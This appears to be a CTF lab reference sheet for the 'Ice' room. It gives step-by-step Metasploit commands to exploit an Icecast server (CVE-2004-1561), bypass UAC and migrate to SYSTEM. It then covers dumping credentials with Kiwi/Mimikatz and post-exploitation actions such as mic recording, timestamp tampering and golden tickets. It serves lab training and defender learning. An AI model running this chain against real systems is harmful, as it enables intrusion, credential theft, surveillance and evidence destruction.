# ❄️ Ice (Exploit → Escalate → Loot) — Reference Sheet

> **TL;DR:** The **Ice** room walks the full offensive chain against a poorly-secured Windows 7 box running a vulnerable **Icecast** media server. Flow: **Nmap recon → Metasploit `icecast_header` exploit (CVE-2004-1561) → Meterpreter foothold → `bypassuac_eventvwr` UAC bypass → migrate into `spoolsv.exe` for SYSTEM → Kiwi/Mimikatz credential looting → post-exploitation**. Core tools: `nmap`, `msfconsole`, `meterpreter`, `kiwi`. This is a prerequisite for the SAL1 *Log Analysis with SIEM* path — the value for a defender is seeing exactly what artifacts each step leaves behind.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| Box doesn't respond to ping | Ice does **not** reply to ICMP. Use `-Pn` with Nmap or you'll think the host is down. |
| Firewall & Defender are OFF | Both the Windows firewall and Defender are intentionally disabled — unrealistically easy, but the point is the exploitation mechanics, not evasion. |
| `RHOSTS` is the only blank required option | On `icecast_header`, `show options` shows **RHOSTS** empty. `RPORT` already defaults to 8000. LHOST/LPORT live under *payload* options, not module options. |
| Empty RHOSTS / wrong LHOST = "no session created" | The #1 reason the exploit "fails". LHOST must be your **tun0** IP (the interface the target can reach back on), not a random local interface. On the AttackBox the primary IP usually *is* correct. |
| nmap won't name port 8000 by default | A plain SYN scan shows `8000/tcp open` with no service. Re-run with `-sV` to get `Icecast`. |
| Hostname needs `-sC` | The hostname `DARK-PC` comes from NSE default scripts (SMB/NetBIOS). Answer is wanted in **ALL CAPS**. |
| Local exploit suggester order varies | The room's expected first exploit is `bypassuac_eventvwr`, but newer Metasploit may list `bypassuac_comhijack` first. The *expected answer is fixed to the room*, not your live output. |
| Process architecture ≠ OS architecture | OS is x64, but the Meterpreter process is **x86** (`x86/windows`). `local_exploit_suggester` "doesn't work best on x64" for this reason. Q asks the *process* arch after escalation → **x64**. |
| Must "live in" an x64 SYSTEM process for LSASS | To touch LSASS you migrate into a process that is **both** x64 **and** SYSTEM. `spoolsv.exe` (Print Spooler) fits and auto-restarts if crashed. |
| Migrate uses the PID, not just the name | `migrate -N spoolsv.exe` works by name, or `migrate <PID>` — but the **PID changes every run**, so read it from your own `ps` output. |
| Dark's password dumps even though Dark isn't logged in | A scheduled task runs Icecast as `Dark`, so the cred sits in memory (LSASS) and Kiwi `creds_all` recovers it: **Password01!**. |
| `timestomp` is an anti-forensics action | The room explicitly warns: never use it on a real pentest unless authorized — it destroys the defender's timeline. |
| Two different nmap IPs in the notes | The walkthrough was done across several deploys, so target IPs differ page to page (lab IPs are ephemeral — not IOCs). Only the *ports/services/hostname* matter. |

## 🔍 Task 2 — Recon (Nmap)

**Purpose:** Enumerate open ports and identify the vulnerable service.

### SYN scan (all ports)

```bash
nmap -sS -v <target_ip>
# -sS = SYN (stealth) scan
# -v  = verbose
# Add -Pn because Ice does not respond to ping
```

### Open ports found

| Port | Service | Note |
|---|---|---|
| 135/tcp | msrpc | Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS |
| 445/tcp | microsoft-ds | SMB |
| **3389/tcp** | **ms-wbt-server** | **MSRDP / Remote Desktop** |
| 5357/tcp | wsdapi | Web Services for Devices |
| **8000/tcp** | **Icecast (http-alt)** | **Vulnerable media server** |
| 49152-49165/tcp | unknown | Dynamic RPC range |

### Service/version detection (name port 8000)

```bash
nmap -sV -p 8000 -v <target_ip>
# -sV = probe service/version
# Result: 8000/tcp open http Icecast streaming media server
```

### Default-script scan (get hostname)

```bash
nmap -sC -v <target_ip>
# -sC = run default NSE scripts (SMB/NetBIOS host discovery)
# Look for: "NetBIOS computer name:" / "Computer name:"
# Result: DARK-PC  (answer in ALL CAPS)
```

|---|---|

## 🧊 Task 3 — Gain Access (Icecast exploit)

**Purpose:** Research the Icecast vuln and exploit it with Metasploit for a foothold.

### Vulnerability research (cvedetails.com)

| Field | Value |
|---|---|
| CVE | **CVE-2004-1561** |
| Description | Icecast Header Overwrite — buffer overflow in header parsing of Icecast ≤ 2.0.1 (sending 32 HTTP headers overwrites a saved pointer; on win32 → code execution) |
| Base Score (CVSS) | 7.5 (7.4 some sources) |
| **Impact Score** | **6.4** |
| Exploitability Score | 10.0 |

### Exploitation with Metasploit

```bash
msfconsole                               # start Metasploit
search icecast                           # find the module
use exploit/windows/http/icecast_header  # or: use 0
show options                             # RHOSTS is the only blank required setting
set RHOSTS <target_ip>                   # the only required option to fill
# LHOST (payload option) should be your tun0 IP; verify:
ip a | grep tun0
set LHOST <attackbox_ip>
exploit                                  # or: run
# => [*] Meterpreter session 1 opened
```

## ⬆️ Task 4 — Escalate (UAC bypass → session as admin)

**Purpose:** Enumerate the host and escalate privileges.

### Recon from Meterpreter

```bash
getuid     # current user  => Dark-PC\Dark
sysinfo    # OS/arch/build => Windows 7, Build 7601, Architecture x64
#          Meterpreter process itself is x86/windows
```

### Local exploit suggester

```bash
run post/multi/recon/local_exploit_suggester
# Can appear to hang while it tests exploits (several minutes).
# Expected "first returned exploit" (room answer):
#   exploit/windows/local/bypassuac_eventvwr
```

### Background, select local exploit, set session + LHOST, run

```bash
background                                        # drop to msf, note session 1
sessions                                          # list sessions when outside meterpreter
use exploit/windows/local/bypassuac_eventvwr      # select local exploit
options                                           # SESSION is now required
set SESSION 1                                      # the session to run against
show options                                       # LHOST still needs fixing
set LHOST <attackbox_ip>                           # the listener IP option = LHOST
run                                                # may need a few attempts
# => Meterpreter session 3 opened (new, elevated)
sessions -i 3                                      # interact with the new session
getprivs                                           # verify expanded privileges
```

### Why `bypassuac_eventvwr` works (high level)

| Step | What happens |
|---|---|
| Checks group | Confirms current user is in **Administrators** |
| Checks UAC | UAC set to **Default** → bypassable |
| Hijack | Abuses `eventvwr.exe` auto-elevation to run payload |
| Result | New elevated Meterpreter session (still in Administrators, UAC bypassed) |

### Key privileges after escalation

`SeDebugPrivilege`, `SeImpersonatePrivilege`, **`SeTakeOwnershipPrivilege`** (lets you take ownership of files — near the bottom of the `getprivs` list).

## 💰 Task 5 — Looting (migrate to SYSTEM → dump creds)

**Purpose:** Migrate into a SYSTEM-level x64 process and dump credentials with Kiwi.

### List processes & migrate into the Print Spooler

```bash
ps                           # list processes; find spoolsv.exe (x64, NT AUTHORITY\SYSTEM)
migrate -N spoolsv.exe       # migrate by name (or: migrate <PID>)
# => [*] Migration completed successfully.
getuid                       # => NT AUTHORITY\SYSTEM
```

| Why `spoolsv.exe`? | |
|---|---|
| Same arch as LSASS | x64 ✔ |
| Same permission level | NT AUTHORITY\SYSTEM ✔ |
| Stable / self-healing | Print Spooler restarts if it crashes ✔ |

### Load Kiwi (Mimikatz) & dump credentials

```bash
load kiwi                    # Kiwi = updated Mimikatz; adds "Kiwi Commands" to help
help                         # view new Kiwi section
creds_all                    # retrieve ALL credentials (parsed)
# => Dark  Dark-PC  Password01!
```

> Dark's password lives in memory because a **scheduled task** runs Icecast as `Dark`, even with no interactive logon. Defender being off makes this trivial.

## 🛠️ Task 6 — Post-Exploitation (Meterpreter actions)

**Purpose:** Explore post-exploitation capabilities via the `help` menu.

| Capability | Command | Category |
|---|---|---|
| Dump all password hashes from SAM | **hashdump** | Priv: Password database |
| Watch remote user's desktop live | **screenshare** | Stdapi: User interface |
| Record from the system microphone | **record_mic** | Stdapi: Webcam/Audio |
| Modify file timestamps (anti-forensics) | **timestomp** | Priv: Timestomp — *don't use unauthorized* |
| Create a Kerberos golden ticket | **golden_ticket_create** | Kiwi |
| Enable RDP on the target | `run post/windows/manage/enable_rdp` | post module |

### Useful related Meterpreter commands

```bash
hashdump                          # dump SAM hashes (we don't crack Admin here — too strong)
screenshare                       # live view of the remote desktop
record_mic                        # capture mic audio
timestomp <file> -m/-a/-c/-e      # manipulate MACE timestamps
golden_ticket_create ...          # Kerberos persistence (any domain user)
run post/windows/manage/enable_rdp  # turn on RDP so we can MSRDP in as Dark
```

## 🧭 Full Attack Flow (one-liner recap)

```
Recon (nmap) → Exploit Icecast (icecast_header / CVE-2004-1561)
  → Meterpreter foothold (as Dark)
  → UAC bypass (bypassuac_eventvwr) → elevated session
  → migrate spoolsv.exe → NT AUTHORITY\SYSTEM
  → load kiwi → creds_all → Password01!
  → post-exploitation (hashdump, screenshare, timestomp, golden_ticket, enable_rdp)
```
